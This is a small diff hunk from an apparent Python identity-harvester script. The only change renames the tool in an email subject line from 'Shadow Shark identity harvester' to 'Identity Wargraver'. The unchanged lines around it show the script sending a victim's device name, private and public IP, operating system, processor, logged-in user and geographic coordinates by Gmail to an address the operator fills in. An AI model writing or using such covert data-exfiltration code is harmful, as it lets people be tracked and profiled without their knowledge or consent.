@@ -64,7 +64,7 @@ while True:
             break
         try:
             GMAIL_SERVICE.sendmail('GMAIL', 'TO', # Set gmail and to on this line.
-f'Subject:Information found by Shadow Shark identity harvester.\n\n\
+f'Subject:Information found by Identity Wargraver.\n\n\
 Device name: {device_name}\nPrivate IP: {private_ip}\nPublic IP: {public_ip}\n\
 OS: {system_version}\nProcessor: {processor}\nCurrent logged in user: {user}\n\
 Coordinates: {coordinates}\n')
